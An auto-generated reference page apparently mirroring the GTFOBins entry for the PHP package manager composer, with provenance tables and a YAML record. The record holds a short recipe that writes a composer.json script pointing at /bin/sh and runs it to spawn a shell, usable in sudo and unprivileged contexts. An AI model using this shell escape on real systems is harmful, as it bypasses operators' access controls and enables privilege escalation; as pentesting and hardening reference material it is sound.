---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# composer

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `composer` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/composer` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [composer](../../tools/linux/composer.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | composer |
| name | composer |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/composer/ |

## Preserved Source Material

```yaml
_body: ''
_name: composer
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/composer
functions:
  shell:
  - code: 'echo ''{"scripts":{"x":"/bin/sh"}}'' >composer.json

      composer run-script x'
    contexts:
      sudo: null
      unprivileged: null
```
